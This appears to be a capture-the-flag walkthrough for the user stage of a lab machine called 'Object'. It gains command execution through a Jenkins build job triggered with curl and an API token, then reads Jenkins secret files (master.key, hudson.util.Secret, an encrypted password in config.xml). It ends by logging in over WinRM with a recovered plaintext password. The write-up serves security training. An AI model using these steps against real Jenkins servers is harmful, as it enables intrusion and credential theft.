# Obejct (Full Pwn)

## User

Starting with nmap to scan for open we have have 2 ports open, 80 and 8080.

![nmap](0.png)

In port 80 there is nothing interesting so we move to port 8080 which is a jenkins ci/cd platform.

![jenkins_landing_page](1.png)

We create a new account to use jenkins for building new projects. We create a new project with name test2. In the configuration page we set the Build Triggers to Trigger Build remotely and add the authentication token with name test. At Build section we add an Execute Windows Batch Command and add the command whoami. Then save the project.

![jenkins_landing_page](3.png)
![jenkins_landing_page](3.1.png)

Next we create the API token, in My Views -> New View -> Configure.

![jenkins_landing_page](4.png)

Finally we can run the request to build remotely with the API token.

` curl http://test:114adaa6de596d28727346566f6c6d7d84@object.htb:8080/job/test2/build?token=test `

Going to project test2 and see the last build and check the console output.

![jenkins_landing_page](6.png)

We got command execution. 

where /R c:\users\oliver\AppData\Local\Jenkins *.xml

cmd.exe /c "type c:\Users\oliver\Appdata\local\jenkins\.jenkins\users\admin_17207690984073220035\config.xml"

<username>oliver</username>
<password>{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}</password>

` cmd.exe /c "type c:\Users\oliver\Appdata\local\jenkins\.jenkins\secrets\master.key" `

` powershell.exe -c "$c=[convert]::ToBase64String((Get-Content -path 'c:\Users\oliver\Appdata\local\jenkins\.jenkins\secrets\hudson.util.Secret' -Encoding byte));Write-Output $c" `




` evil-winrm -i object.htb -u oliver -p c1cdfun_d2434 `